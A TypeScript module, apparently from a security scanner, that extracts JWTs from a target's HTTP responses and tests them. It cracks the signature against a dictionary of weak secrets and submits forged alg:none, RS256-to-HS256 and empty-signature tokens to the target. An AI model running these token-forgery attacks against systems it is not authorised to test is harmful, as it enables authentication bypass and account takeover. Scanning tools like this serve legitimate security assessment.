import { ts } from '../context';
import { probe } from '../utils/http';
import type { RealFinding, Target, LogFn } from '../context';

function decodeJwtPart(part: string): unknown {
  try {
    return JSON.parse(Buffer.from(part, 'base64').toString('utf-8'));
  } catch {
    return null;
  }
}

const JWT_WEAK_SECRETS = [
  'secret', 'password', '123456', 'qwerty', 'abc123', 'changeme', 'jwt_secret',
  'your_secret_key', 'mysecret', 'key', 'test', 'dev', 'admin', 'letmein',
  'token', 'jwt', 'jwttoken', 'secret123', 'myapp', 'supersecret', 'verysecret',
  'jwt_signing_key', 'hmackey', '', 'null', 'undefined', 'default',
];

function hmacSign(data: string, secret: string): string {
  try {
    const { createHmac } = require('node:crypto') as typeof import('node:crypto');
    return createHmac('sha256', secret).update(data).digest('base64url');
  } catch { return ''; }
}

export async function checkJwtAdvanced(target: Target, token: string, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  const parts = token.split('.');
  if (parts.length !== 3) return findings;
  const [rawHeader, rawPayload, sig] = parts as [string, string, string];
  const header = decodeJwtPart(rawHeader) as Record<string, unknown> | null;
  const payload = decodeJwtPart(rawPayload) as Record<string, unknown> | null;
  if (!header || !payload) return findings;
  await onLog(`[${ts()}] JWT token found — alg: ${header['alg']}, testing weaknesses...`);

  // Brute-force weak secrets
  for (const secret of JWT_WEAK_SECRETS) {
    const candidate = hmacSign(`${rawHeader}.${rawPayload}`, secret);
    if (candidate === sig) {
      findings.push({
        title: `JWT Signed With Weak Secret: "${secret}"`,
        severity: 'critical',
        verification: 'verified',
        confidence: 99,
        cvss: 10.0,
        cve: null,
        description: `JWT is signed with the dictionary secret "${secret}". Any attacker can forge arbitrary tokens.`,
        evidence: `Token header: ${JSON.stringify(header)}\nSECRET CRACKED: "${secret}"`,
        remediation: 'Use a cryptographically random secret of at least 256 bits.',
      });
      await onLog(`[${ts()}] ⚠ JWT CRACKED: "${secret}"`);
      break;
    }
  }

  // alg:none attack
  const noneHeader = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
  const noneToken = `${noneHeader}.${rawPayload}.`;
  const noneR = await probe(target.url, { headers: { Authorization: `Bearer ${noneToken}` }, timeoutMs: 8_000, skipAuth: true });
  if (noneR && noneR.status === 200 && !noneR.body.toLowerCase().includes('unauthorized')) {
    findings.push({
      title: 'JWT Algorithm "none" Accepted — Token Forgery Possible',
      severity: 'critical',
      verification: 'verified',
      confidence: 97,
      cvss: 10.0,
      cve: null,
      description: 'The server accepted a JWT with alg:none and no signature.',
      evidence: `Modified header: {"alg":"none","typ":"JWT"}\nHTTP ${noneR.status} — authenticated response`,
      remediation: 'Enforce only allowed algorithms (HS256/RS256); reject alg:none.',
    });
    await onLog(`[${ts()}] ⚠ JWT ALG:NONE ATTACK SUCCESSFUL`);
  }

  // RS256 → HS256 confusion
  if (header['alg'] === 'RS256') {
    const hs256Header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
    const confusedSig = hmacSign(`${hs256Header}.${rawPayload}`, 'public-key');
    const confusedToken = `${hs256Header}.${rawPayload}.${confusedSig}`;
    const confusedR = await probe(target.url, { headers: { Authorization: `Bearer ${confusedToken}` }, timeoutMs: 8_000, skipAuth: true });
    if (confusedR && confusedR.status === 200) {
      findings.push({
        title: 'JWT RS256→HS256 Algorithm Confusion Attack',
        severity: 'critical',
        verification: 'verified',
        confidence: 92,
        cvss: 9.8,
        cve: null,
        description: 'Server accepted HS256 token when RS256 is expected.',
        evidence: `Original alg: RS256\nConfused alg: HS256\nHTTP ${confusedR.status} — authenticated response`,
        remediation: 'Enforce explicit algorithm selection server-side.',
      });
      await onLog(`[${ts()}] ⚠ JWT RS256->HS256 CONFUSION ATTACK SUCCEEDED`);
    }
  }

  // Empty signature
  const emptyToken = `${rawHeader}.${rawPayload}.`;
  const emptyR = await probe(target.url, { headers: { Authorization: `Bearer ${emptyToken}` }, timeoutMs: 8_000, skipAuth: true });
  if (emptyR && emptyR.status === 200) {
    findings.push({
      title: 'JWT Empty Signature Accepted',
      severity: 'critical',
      verification: 'verified',
      confidence: 95,
      cvss: 9.8,
      cve: null,
      description: 'Server accepted JWT with an empty signature.',
      evidence: `Empty signature token → HTTP ${emptyR.status}`,
      remediation: 'Verify JWT signature on every request.',
    });
    await onLog(`[${ts()}] ⚠ JWT EMPTY SIGNATURE ACCEPTED`);
  }

  return findings;
}

export async function checkJwtWeaknesses(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  await onLog(`[${ts()}] Hunting for JWT tokens in responses...`);
  const findings: RealFinding[] = [];
  const r = await probe(target.url, { timeoutMs: 8_000 });
  if (!r) return findings;

  const tokenRegex = /eyJ[A-Za-z0-9_-]{5,}\.eyJ[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]*/g;
  const tokens = r.body.match(tokenRegex) ?? [];
  const authHeader = r.headers['authorization'] ?? '';
  if (authHeader.startsWith('Bearer ')) tokens.push(authHeader.slice(7));

  for (const token of [...new Set(tokens)].slice(0, 3)) {
    const sub = await checkJwtAdvanced(target, token, onLog);
    findings.push(...sub);
  }

  if (tokens.length === 0) {
    await onLog(`[${ts()}] No JWT tokens discovered in responses`);
  }
  return findings;
}
